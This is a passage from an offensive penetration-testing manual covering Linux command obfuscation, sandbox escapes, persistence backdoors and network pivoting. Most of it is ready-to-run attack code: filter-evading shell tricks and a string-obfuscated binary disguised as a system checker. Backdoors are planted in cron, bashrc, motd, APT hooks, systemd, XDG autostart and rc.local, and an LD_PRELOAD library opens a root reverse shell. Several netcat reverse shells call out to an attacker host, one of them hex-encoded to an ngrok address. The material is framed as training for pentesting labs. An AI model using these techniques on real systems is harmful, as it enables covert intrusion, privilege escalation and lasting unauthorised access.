IFS=,;`cat<<<ls,-la`
```
```bash
v=$'ls\x20-la'&&$v
```
```bash
echo${IFS}-e${IFS}"ls\x09-l"|sh
```
- _create a file with newlines escaped:_
```bash
echo${IFS}"command_to_execute"${IFS}|${IFS}sed${IFS}'s/./&\\\n/g'${IFS}>${IFS}file.txt
bash${IFS}file.txt 
```

#### Alternative shell execution:
We can bypass some security products by avoiding notorious shell names such as `sh, bash, rbash, dash, pwsh, tmux, screen ,zsh, ash, tcsh' too do so we can use tricks to call a shell:

- _Via shell variable:_
```bash
echo <command_to_execute> |$0
```
- _Via backticks:_
```bash
`echo <command_to_execute>`
```
- _Via command substitution:_
```bash
$(echo <command_to_execute>)
```
- _Via backticks and created files:_
```bash
mkdir /tmp/test  #we will create an empty folder
cd /tmp/test
touch -- 'command to execute'  #then we can create a file that that has the payload in the filename  
`ls`  #eventually with command substitution we can execute the file via getting its name
```
_Via backticks and Create file 2:_
```bash
cd /tmp/test
echo '' > 'command_to_execute'
`ls`
```

#### BashFuscator:
This powerfull [tool](https://github.com/Bashfuscator/Bashfuscator) can create large obfuscated payloads.

Commands to install it:
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
```
#### DISCLAIMERS:
__DOESN'T WORK 100% OF TIME SO TEST IT BEFORE RUNNING (-test)!__

__YOU NEED A BASH INTERPRETER IN ORDER TO RUN IT!__

__FILE SIZE CAN RAMP UP PRETTY QUICKLY!__

__RUN MULTIPLE TIMES THE COMMAND TO GET A SMALLER PAYLOAD!__

Now we can generate payload like this (with -o we will save it to file):
```bash
bashfuscator -c '<command_to_run>' --no-file-write --no-random-whitespace --no-insert-chars --no-integer-mangling --no-terminator-randomization --choose-mutators command/case_swapper command/reverse -s 1 -t 3 --layers 2 -o /tmp/obfuscate_command.sh  
```
if this doesn't work try this one:
```bash
bashfuscator -c '<command_to_run>'  -o /tmp/obfuscated_command.sh --test #use --test to check the command
```
We can also obfuscate an entire script file like this:
```bash
bashfuscator -f '<file_to_run>'  -o /tmp/obfuscated_file.sh --test #use --test to check the command
```
### Source code obfuscation:
If we want to be a little more sthealtier we can use, instead of bash terminal commands compiled c binaries.<br>
Using plain strings in those binaries will be pretty stupid because even with a strings command we will be caught, to avoid that we can use a tool to obfuscate those strings.<br>
The tool is [this one](https://github.com/4g3nt47/Obfuscator).<br>
The installation is pretty simple:
```bash
git clone https://github.com/4g3nt47/Obfuscator.git
# Compile
cd Obfuscator
mkdir bin
make
# Install
sudo make install
# Clean
make clean
```
Now we can create our binary in c named `debiansyschecker.c`:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


char *check_debian_status(char str[]){

  unsigned char key = 144; 
  size_t len = strlen(str);
  unsigned char curr_key;
  for (int i = 0; i < len; i++){
    curr_key = key * (i + 1);
    while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126))
      curr_key += 47;
    str[i] = str[i] ^ curr_key;
    key = curr_key;
  }
  return str;
}

int main() {
    // The command to be executed
    char cmd[] = "[OBFS_ENC]echo ZWNobyAib2JmdXNjYXRlZCBzdHJpbmdzISI=  | base64 -d | bash"; //print a string if succesfull

    // Execute the command using system()
    check_debian_status(cmd);
    int result = system(cmd);

    // Check the result
    if (result == -1) {
        perror("Error checking the version");
        exit(EXIT_FAILURE);
    }

    return 0;
}
```
Now we can compile the script with no string optimization:
```bash
gcc -Os debiansyschecker.c -o debiansyschecker -static
```
Once we have done that we can run the obfuscator script that we installed above:
```bash
obfuscator <input_binary> <output_binary> <encryption_key>
#example:
obfuscator debiansyschecker debiansyschecker_x86 144 #the default key
```
Now we can now run strings against the binary or also open ghidra, no strings will be found.
## Sandbox bypass:
Some applications can expose services with a restricted access like a bash with limitation, as we saw with the command above.<br>
There are some programming languages that has functionalities to run in a restricted enviroment.
#### Docker sandbox:
In a production environment, applications are often deployed through Docker containers.<br>
By doing this, developers and DevOps can easily manage the infrastructure for scalability, availability, and redundancy.<br>
For attackers this imply a restricted access in case of website rce or code injection.<br>
If we manage to get a shell on a Docker filesystem we can try to escape the container, in order to do that we need to enumerate the environment.<br>
Containers has a feature where you can remove al the binary that are not necessary for the container purpose, but we can upload a static copy of the compiled binary:<br>
In those GitHub repos we can find some precompiled binaries that we can import inside containers:<br>

- https://github.com/andrew-d/static-binaries
- https://github.com/ZephrFish/static-tools/tree/master

To upload them i use [pwncat-cs](https://github.com/calebstewart/pwncat):

```bash
#start a listener, or use a bindshell
pwncat-cs -lp <port>  #for a listener
pwncat-cs ssh://<username>:<password>@<ip>:<port>   #start a ssh bindshell connection
```
Once you have a pwncat connection you can enter the local shell utility with `Ctrl + d` then type:
```bash
upload <file_to_upload> <destination>
```
#### Python sandbox:
Python has a configuration setup where you can specify which command are restricted and also which built-in modules you can use or import:

##### No boundary
If we have no restrictions we can just execute code:

- __os module:__
```python
import os;os.system('<command>')
os.popen("<command>").read()
```

- __subprocess module:__
```python
subprocess.call("<command>", shell=True)
subprocess.Popen("<command>", shell=True)
subprocess.run("<command>"), shell=True)
```

##### Forbidden import string:
```python
#!/usr/bin/env python3
import sys
import code

# for code.InteractiveConsole to send stack traces to stdout
sys.excepthook = sys.__excepthook__

class RestrictedConsole(code.InteractiveConsole):

	def __init__(self, locals, blacklist, *a, **kw):
		super().__init__(locals, *a, **kw)
		self.blacklist = blacklist.copy()
		
	def runsource(self, source, *a, **kw):
		if not source.isascii() or any(word in source for word in self.blacklist):
			print("Blacklisted word detected, exiting ...")
			sys.exit(1)
		return super().runsource(source, *a, **kw)
	
	def write(self, data):
		sys.stdout.write(data)

# keep all the builtins except open
safe_builtins = {
	k:v for k,v in __builtins__.__dict__.items() if k != "open" 
}
locals = {'__builtins__': safe_builtins}

blacklist = ['import', 'os', 'system', 'subproces', 'sh']

RestrictedConsole(locals, blacklist).interact()
```
We can bypass a restriction above in some ways like:
```bash
echo -n "<python_script_to_run>" | od -An -vtu1 |  sed 's/  / /g' | sed 's/ /\\/g' | tr -d '\n' #encode in ascii format \137...
```
Then you can just pass the output of the command inside the `exec()` function:
```python
exec("<ascii_code>")
```
example: `exec("\70\72\69\6e\74\28\22\68\65\6c\6c\6f\20\77\6f\72\6c\64\22\29")  #print hello world`

##### Only help:
With the following script you can host a python shell where you can only execute the help() function:
```python
#!/usr/bin/env python3
import sys
import code

# for code.InteractiveConsole to send stack traces to stdout
sys.excepthook = sys.__excepthook__

class RestrictedConsole(code.InteractiveConsole):

	def __init__(self, locals, blacklist, *a, **kw):
		super().__init__(locals, *a, **kw)
		self.blacklist = blacklist.copy()
		
	def runsource(self, source, *a, **kw):
		if not source.isascii() or any(word in source for word in self.blacklist):
			print("Blacklisted word detected, exiting ...")
			sys.exit(1)
		return super().runsource(source, *a, **kw)
	
	def write(self, data):
		sys.stdout.write(data)

# just safe builtins
safe_builtins = {
	'help': help,
}
locals = {'__builtins__': safe_builtins}

blacklist = ['import', 'os', 'system', 'subproces', 'sh', '"', '\'',]

RestrictedConsole(locals, blacklist).interact()
```
As we can see the builtins is only help, and other strings like import, os, __"__ and __'__ are banned; this make it very hard to get command exection.

However we can bypass this with [user defined functions](https://docs.python.org/3/reference/datamodel.html#user-defined-functions).<br>
With the following command we can get all the classes:
```python
().__class__.__base__.__subclasses__()
```
If we have this class between the classes `<class 'code.InteractiveInterpreter'>` we can imports all the builtins modules:
```bash
a = ().__class__.__base__.__subclasses__()[-8]  #change this number with the array position of the class code.InteractiveInterpreter
b = a.__init__.__globals__
__builtins__ = [*b.values()][7]   #with this we will imports all the std modules
open(chr(100)+chr(101)+chr(90)).read()  #we can get LFI on the machine
```

# Persistence:
Once we gained command execution on the machine we need to access it whenever we want, also even after a restart for this reason we need to install persistence on the machine, possibly in a obfuscated way.

## Obfuscated persistence:
we can create a clever payload, mixing some of the obfuscation techniques we saw above:
_Shell via filename:_
```bash
mkdir /tmp/a2b3c4;cd /tmp/a2b3c4;touch -- 'echo -e \x62\x75\x73\x79\x62\x6f\x78\x20\x6e\x63\x20\x37\x2e\x74\x63\x70\x2e\x65\x75\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x30\x32\x38\x33\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x26';cd ../; `ls a2b3c4`|$0;rm -rf a2b3c4
```

## Add user:
we can backdoor a system by creating another user in PAM context:
```bash
sudo useradd -ou 0 -g 0 <new_username>
sudo passwd <new_username>
echo "<new_password>" | passwd --stdin <new_username>
```

## Crontab:
we can create a crontab with running a command a bunch of seconds after the start of the machine:
```bash
(crontab -l ; echo "@reboot sleep 30 <command_to_execute>")|crontab 2> /dev/null
```

## Backdoor bashrc:
every time a shell session starts it loads a profile called .<shell_name>rc <br>
this profile eventually is bash code, so we can insert comands there like this:
```bash
echo '<command>' >> ~/.bashrc
```
to obfuscate the code better, hide the command in the middle of the file, maybe inside an if that get accessed frequently
## Backdoor motd:
The "Message of the Day" (MotD) in Linux is a customizable text displayed to users upon login.<br>
Is another bash script, similar to .bashrc where we can inject our code:
```bash
echo '<command_to_run>' >> /etc/update-motd.d/00-header
```
it's better to avoid printed text, you can also write the command before the banner, so you can run the script, send in background then `clear` and the banner will appear.

## Backdoor Webshell:
On the target machine if the LAMP stack (Linux, Apache, MySQL/MariaDB and PHP/Perl/Python) is present and we have the appropriate permissions, we could load a webshell that allows a backdoor, we can create one via meterpreter
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<port> -e php/base64 -f raw > <output file>
```
Remember to set up your listener, and when the revshell upload is complete, visit the correct URL to trigger it.

## Backdoor Apt:
We can set a backdoor on APT command, indeed whenever `apt update` run, we can get an access with the following command:
```bash
echo 'APT::Update::Pre-Invoke {"nohup nc -lvp <port> -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/<name>
```

## Backdoor Systemd:
systemd is the init system and service manager in most Linux distributions, can be a source of persistence by creating our own script in bash and a service.

- __Services:__

First step create the bash script:
```bash
nano <name>.sh

#!/bin/bash
busybox nc <ip> <port> -e /bin/bash
```
Execute right:
```bash
chmod +x <name.sh>
```
Second step we need to create the fake `.service`:
```bash
sudo nano /etc/systemd/system/<name>.service

[Unit]
Description=<fake description>
After=network.target

[Service]
Type=simple
ExecStart=<path to bash script>
Restart=on-abort

[Install]
WantedBy=multi-user.target
```
Third step we must reload services folder, enable and start the service:
```bash
sudo systemctl daemon-reload

sudo systemctl enable <name>.service
sudo systemctl start <name>.service
```

- __Services + Timers:__

This backdoor methodology is the same as the one above only with a variation, we decide when the service is to be activated, via timers:

__The .service and .timer must have the same name__

First step create bash script and .services file:
```bash
nano <name>.sh

#!/bin/bash
busybox nc <ip> <port> -e /bin/bash
```
Execute right:
```bash
chmod +x <name.sh>
```
service file:
```bash
sudo nano /etc/systemd/system/<name>.service

[Unit]
Description=<fake description>
After=network.target

[Service]
Type=simple
ExecStart=<path to bash script>
Restart=on-abort

[Install]
WantedBy=multi-user.target
```
Second step we need to create the .timer file:
```bash
sudo nano /etc/systemd/system/<name>.timer

[Unit]
Description=<fake description>

[Timer]
OnBootSec=5
OnUnitActiveSec=5m #it will turn on every 5 minutes

[Install]
WantedBy=timers.target
```
Third step we must reload services and timer folder, activate the .service and .timer:
```bash
sudo systemctl daemon-reload

sudo systemctl enable <name>.timer
sudo systemctl start <name>.timer

sudo systemctl enable <name>.service
sudo systemctl start <name>.service
```
Commands to check if the .timer and .service are working:
```bash
systemctl list-units --type=service
```
```bash
systemctl list-timers
```
## Backdoor SO:

- __LD_PRELOAD:__

LD_PRELOAD is an environment variable in Linux and other Unix-like operating systems that allows you to specify a list of additional dynamic shared objects by unsetting the env variable we can specify a custom SO.

__Usually LD_PRELOAD is not set by default__

We can first check the target shared object with the following command:
```bash
strace <path_to_binary_command>
```

Example: `strace /bin/cat`

Output:
```
execve("/bin/cat", ["/bin/cat"], 0x7ffc0f5e5430 /* 56 vars */) = 0
brk(NULL)                               = 0x5574c4efe000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6c7d123000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory) #we can 
```
we can change `ld.so.preload`.

Now create the source code in C:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -i 5<> /dev/tcp/<ip>/<port> 0<&5 1>&5 2>&5");
}
```
Compile it:
```bash
gcc -fPIC -shared -nostartfiles -o <name>.so <path_to_source_code_in_C>
```
Then copy it:
```bash
`echo <path to so file>.so >> /etc/<target so>` 
```

- __LD_LIBRARY_PATH:__

This variable set the path of the shared library that the file runned with sudo will pick, to check which shared library our executable is importing we can do:

__Usually LD_LIBRARY_PATH is not set by default__

```bash
strace <path_to_binary_command>
```

Example: `strace /bin/cat`

Output:
```
execve("/bin/cat", ["/bin/cat"], 0x7ffc0f5e5430 /* 56 vars */) = 0
brk(NULL)                               = 0x5574c4efe000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6c7d123000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory) #we can 
```
we can change `ld.so.preload`.

Now create the source code in C:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -i 5<> /dev/tcp/<ip>/<port> 0<&5 1>&5 2>&5");
}
```
Compile it:
```bash
gcc -fPIC -shared -nostartfiles -o <name>.so <path_to_source_code_in_C>
```
Then we just need to run the file by setting the path of the shared libraries:
```bash
sudo LD_LIBRARY_PATH=/tmp <file_to_run_with_sudo> 
```

## Backdoor XDG:

XDG (X Desktop Group) is a standard defined by the freedesktop.org project that specifies how Linux desktop environments should handle the automatic launch of applications at system start-up.

It can be backdoored by creating a custom `.desktop` file in  `~/.config/autostart/ ` that points to a bash script, following the steps below:

First we create the bash script:
```bash
#!/bin/bash

busybox nc <ip> <port> -e /bin/bash
```

Then:
```bash
chmod +x <script.sh>
```
Second step we create the .desktop file to save in `~/.config/autostart/:

__by default the autostart folder is not present, create it anyway.__

```bash
nano <name>.desktop

[Desktop Entry]
Type=Application
Exec=<path_to_bash_script>
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=<custom_name>
```
Then:
```bash
chmod +x <name>.desktop
```
__A bash script can also be placed directly in the `~/.config/autostart/`__

## Backdoor rc.local:

rc.local is a file in the `/etc` folder that runs on every boot, we can insert a malicious bash command into it or point to another script

```bash
sudo nano /etc/rc.local

#!/bin/bash
busybox nc <ip> <port> -e /bin/bash
```
Then:
```bash
sudo chmod +x /etc/rc.local
```
at the next boot our revshell will be launched.

# Pivoting:
Pivoting is crucial in penetration testing as it allows for lateral movement within a network, mimicking real-world cyber threats.

This technique helps uncover hidden vulnerabilities and weaknesses that may not be apparent from an initial entry point, enhancing the overall assessment of a company's security posture by exploring different segments of the network, a penetration tester can simulate advanced attack scenarios and provide more comprehensive insights for risk mitigation.

In order to do that we can use various methods to both evade detection and work around missing tools.<br>
### SSH tunneling:
SSH tunneling is probably the easiest way to pivot trough a machine, in fact we can activate port forward with the following command:

#### Forward tunnel:
Also called remote port forwarding it allows to map port from the remote machine/network to our local port (127.0.0.1):
```bash
ssh <user>@<victim> -L <our_local_port>:<remote_ip_to_forward>:<remote_port_to_forward>
```
#### Reverse tunnel:
Also called local port forwarding it allows to make our local port accessible from the remote host:
```bash
ssh <user>@<victim> -R <remote_ip_that_can_access_our_local_port>:<remote_port_to_bind_to>:<our_local_port_to_forward>
```
### Metasploit:
metapsloit also allows pivoting techniques but the first step is to check our network interfaces:
```bash
ip a
ifconfig
```
Then scan the subnet of the network we want, we can do that with metasploit module:
```bash
# Ctrl + z to background the existing shell
use post/windows/gather/arp_scanner  #set discovery module
set SESSION <session_id>
set RHOSTS <subnet_to_scan_CIDRE_notation>  #example: 192.168.1.0/24
run #to start module
```
now we need to add a routing rule to route all the traffic via the session that we compromised:
```bash
#background the meterpeter session
route add <subnet_to_interact_with_no_CIDR> 255.255.255.0 <session_id>
use auxiliary/server/socks_proxy
```
To visit the port we can add a socks proxy configuration on proxychain (preinstalled on kali):
```bash
#on our local machine:
echo 'socks4 127.0.0.1 1080' >> /etc/proxychains4.conf #use your proxychain config file
```
if we want to connect to the host on a subnet that we forwarded we can run:
```bash
proxychains4 <command_to_run>
```
example: `proxychain4 mysql -h 10.10.10.8 -u root -proot #we can access the subnet that we couldn't before proxy`

Now we can also start a portscan with another metasploit module:
```bash
#background the session
use auxiliary/scanner/portscan/tcp
set RHOSTS <host_to_scan_on_new_subnet>  #can also pass multiple hosts like this: 192.168.1.2,3,4,11
set PORTS <ports_to_scan>  #can also be passed as a range like: 1-6000
```

### Meterpeter forward:
meterpreter offers a powerfull integrated tool to forward ip and ports when we are inside a meterpreter shell.<br>
```bash
#inside meterpreter prompt
portfwd add -l <port_that_we_open_locally> -p <remote_port_to_forward_to_us> -r <remote_ip_to_forward>
```
example: `portfwd add -l 8080 -p 80 -r 192.168.1.2` this will forward the port 80 of the 192.168.1.2 on our 127.0.0.1:8080

example 2: `portfwd add -l 8080 -p 80 -r 127.0.0.1` this will forward the port 80 open ONLY in remote localhost on OUR 127.0.0.1:8080

### Meterpeter reverse:
above we saw how to forward a remote port to us, here we will se how to access our local ports on remote host:
```bash
portfwd add -R -L <our_localip_where_we_listen> -l <our_localPort_where_we_listen> -p <remote_port_to_listen_on>
```
example: `portfwd add -R -L <127.0.0.1> -l 7777 -p 80` all the traffic towards the remote machine on port 80 will be redirected to our port 127.0.0.1:7777

- _tips:_ <br>
to remove all portfwd rules just type:
```bash
portfwd flush
```
## Chisel:
[Chisel](https://github.com/jpillora/chisel) is a portable binary that can be run on the attack box or the target that offers tunneling and port forward capabilities.<br>
to use it we need both the client and the server executable, is writen in Go so it's pretty portable i'd say:
```bash
go install github.com/jpillora/chisel@latest #for chisel installation
which chisel #we need this path so we can upload the binary to other linux servers.
```
or we can download the version we need:
```bash
https://github.com/jpillora/chisel/releases/tag/v1.9.1
```
once we uploaded the binary on the remote machine we can setup the tunnel:<br>
- _On the attacker machine:_
```bash
chisel server --socks5 --reverse
#will generate a fingerprint 
```
- _On the victim machine:_
```bash
./chisel client --fingerpring <server_fingerprint> <ip_where_chisel_server_runs>:<server_port> R:<local_attacker_port>:<remote_ip_to_access>:<remote_port_to_forward_to_our_local>  #default server port is 8080
```
with the command above we can visit our port and see what's on the remote port
### Chisel socks proxy:
We can also use the socks proxy to forward every ports:
_on the victim machine:_
```bash
#keep the above server configuration
./chisel client --fingerprint <server_fingerprint> <chise_server_ip>:<chisel_server_port> R:socks
```
to access them we need to use proxychains:
```bash
#on local attacker machine
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
proxychains4 <command_to_run>
```
example: `proxychains4 curl 10.10.10.4` host that wasn't accessible before

## Ligolo:
[ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a pivoting tool that create tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).<br>
In order to run it we need two binaries: `ligolo agent` and `ligolo proxy`.

They can be downloaded [here](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.1) for the correct version of your attacker machine.

We can extract the agent and the proxy with:
```bash
tar xzvf <agent_file>
tar xzvf <proxy_file>
```
### Pivoting:
Let's imagine we land in a machine of our subnet (for example 10.10.1.0/24) but the machine has another internal subnet that we want to scan.<br>
In order to do it we need to pivot the traffic trough the first compromized machine.<br>
To route the traffic we will use a fisical interface, to create it we need to run:
```bash
#on local attack box
sudo ip tuntap add user <username> mode tun ligolo #my username is kali
sudo ip link set ligolo up #turn on the interface
```
On the attack box is pretty simple, in fact we just need to run the ligolo proxy:<br>
_if we are in a test environment we can use a self signed cert_
```bash
./proxy -selfcert 
```
_in a real pentest you can use the `-autocert` flag to request a cert with let's encrypt_
```bash
./proxy -autocert 
```
On the victim machine we need to import the agent binary (with correct os and version) and run it:
```bash
./agent -connect <attacker_ip>:11601 #default ligolo proxy port
```
_if we are in a test environment and the victim doesn't have WAN access we can ignore the certificate check_:
```bash
./agent -connect <attacker_ip>:11601 -ignore-cert
```
Once we did this (if it's all correct) we will have a connection on the ligolo proxy running on our attack box.<br>
To manage the connection we can do:
```bash
session #if we have one we can just click enter
#once we are in the interactive session of the host
ifconfig #check the victim interfaces
```
once we find an internal subnet on the victim machine (let's say 172.17.1.0/24) we can now add a route to reach it via ligolo proxy:
```bash
sudo ip route add <victim_machine_internal_subnet_CIDR> dev ligolo
```
example: `sudo ip route add 172.17.1.0/24 dev ligolo`

Now back to the interactive ligolo session we need to type:
```bash
start
```
Now we can interact with that subnet from our attack box, without using proxychains, like we are on it:
```bash
nmap 172.17.1.0/24 -sn -Pn
```
### Reverse shell setup:
if we want to get a reverse shell from a machine inside the victim subnet(for example the 172.17.1.4), he need to see us on the network.<br>
we can instead listen for connection on the agent(for example the 172.17.1.2), forward them to our attack box and set as revshell the agent as revshell ip
On the ligolo console we need to type:
```bash
listener_add --addr 0.0.0.0:<agent_port_where_revshell_first_get> --to 127.0.0.1:<our_local_port_where_listen> --tcp
```
example: `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`

Now to get the revshell:<br>
_on the attack box:_
```bash
nc -lvnp <our_local_port_where_listen>  #just use the listener you like the most
```
_on second victim:_
```bash
busybox nc <ip_of_first_victim(the_pivot_agent)> <pivot_agent_port> -e bash
```
example: `busybox nc 172.17.1.2 30000 -e bash`

Eventualy on the attack box we will get the revshell.<br>
### Internal agent ports:
If we want to access the 127.0.0.1 of the agent machine we can use the reserved ip of ligolo-ng:
```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```
Now every packet towards 240.0.0.1 will be to and from the 127.0.0.1 of the pivot machine.

_TO DO_
# Special Thanks
I want to express my gratitude to the sources that have greatly contributed to this manual.<br>
The insights from [tryhackme](https://tryhackme.com/), [HackTheBox](https://academy.hackthebox.com/), and [HackTrix](https://book.hacktricks.xyz/welcome/readme) have been instrumental in shaping the content and ensuring its accuracy.<br> Special thanks to all the above and my friend [AleHelp](https://github.com/AleHelp) that contributed with a deep research of the linux enumeration and some Exploits.
